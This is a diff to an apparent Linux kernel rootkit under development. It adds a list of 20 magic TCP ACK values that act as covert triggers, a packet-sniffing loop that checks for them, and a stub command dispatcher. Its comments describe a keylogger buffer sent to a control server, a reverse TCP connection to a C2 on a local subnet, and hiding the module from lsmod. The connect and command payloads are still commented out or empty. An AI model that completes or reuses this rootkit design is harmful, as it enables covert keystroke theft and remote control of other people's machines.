@@ -62,6 +62,29 @@ struct socket      *sock;
  * REVERSE TCP SHELL FUNCTIONALITY
 **/
 int connection_state;
+unsigned long int acks[] =
+{
+	2035414082,
+	1923488235,
+	1039496434,
+	455162575,
+	1256802356,
+	121160666,
+	775584247,
+	400038231,
+	966583691,
+	1678453465,
+	653897989,
+	1891123724,
+	584692231,
+	1540142942,
+	1462005693,
+	1331651723,
+	1698886690,
+	763403905,
+	1671908051,
+	922525094
+};
 
 /**
  * Correlates with the key definitions found in:
@@ -159,6 +182,10 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 					/**
 					if (connection_state)
 						// send buffer to control server
+					else
+						// switch to userspace
+						// write butter to file
+						// exit userspace to kernelspace
 					**/
 				}
 			}
@@ -175,7 +202,7 @@ static struct notifier_block nb =
 };
 
 
-void reverse_connect(unsigned long int ack_seq)
+void reverse_connect(void)
 {
 	// unsigned long  int server_ip;
 	// unsigned short int server_port;
@@ -187,8 +214,7 @@ void reverse_connect(unsigned long int ack_seq)
 	}
 
 	/**
-	 * server_ip and server_port are undefined.
-	 * Use ack_seq to enumerate both a server and port.
+	 * server_ip and server_port are still undefined.
 	**/
 	memset(&sock_in, 0, sizeof(sock_in));
 	//sock_in.sin_addr.s_addr = htonl(server_ip);
@@ -200,8 +226,63 @@ void reverse_connect(unsigned long int ack_seq)
 	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
 		printk("Could not connect [expected].\n");
 	else
+	{
+		connection_state = CONNECTED;
 		printk("Connected to server.\n");
+	}
 	**/
+}
+
+
+/* Up to 20 different commands. */
+void handle_command(unsigned long int ack_seq)
+{
+	printk("Handling: %lu\n", ack_seq);
+	switch (ack_seq)
+	{
+		case 2035414082:
+			break;
+		case 1923488235:
+			break;
+		case 1039496434:
+			break;
+		case 455162575:
+			break;
+		case 1256802356:
+			break;
+		case 121160666:
+			break;
+		case 775584247:
+			break;
+		case 400038231:
+			break;
+		case 966583691:
+			break;
+		case 1678453465:
+			break;
+		case 653897989:
+			break;
+		case 1891123724:
+			break;
+		case 584692231:
+			break;
+		case 1540142942:
+			break;
+		case 1462005693:
+			break;
+		case 1331651723: 
+			break;
+		case 1698886690:
+			break;
+		case 763403905:
+			break;
+		case 1671908051:
+			break;
+		case 922525094:
+			break;
+		default:
+			break;
+	}
 }
 
 
@@ -213,6 +294,8 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 
 	unsigned long int ack_seq;
 	unsigned long int seq;
+
+	int i;
 	
 	printk("One packet received.\n");
 	ip_header = (struct iphdr *)skb_network_header(skb);
@@ -227,13 +310,26 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 		printk("ack_seq: %lu\n", ack_seq);
 		printk("seq:     %lu\n", seq);
 
-		/* Use after magic 'ACK' was received. Decide on magic 'ACK'. */
+		/* Use after magic 'ACK' was received. Refer to 'acks'.       */
 		/* Server IP and Port could be enumerated from"magic ACK".    */
 		/* Could have numerous magic ACK's in a magic list!			  */
-		/**
-		if (ack_seq == [MAGIC_ACK_IN_LIST] && !connection_state)
-			reverse_connect(ack_seq);
-		**/
+		
+		for (i = 0; i < 20; i++)
+		{
+			if (ack_seq == acks[i])
+			{
+				if (!connection_state)
+				{
+					printk("Would attempt to connect.\n");
+					connection_state = CONNECTED;
+					//reverse_connect();
+					// or, if ack_seq enumerates server ip / port..
+					// reverse_connect(ack_seq);
+				}
+				else
+					handle_command(ack_seq);
+			}
+		}
 	}
 
 	kfree_skb(skb);
@@ -261,6 +357,7 @@ int start_listen(void *args)
  *   - Hide the module:
  *     + Option1:  Overwrite "lsmod"
  *     + Option2:  Delete module listing "rootkit" from modules.
+ *     + Do this last (for the sake of debugging).
  *   - Configure rootkit to be a client.
  *     + Will connect to the control-server on the 192.168.1.0/24 subnet.
  *     + This connection is, thus, a reverse-TCP connection.
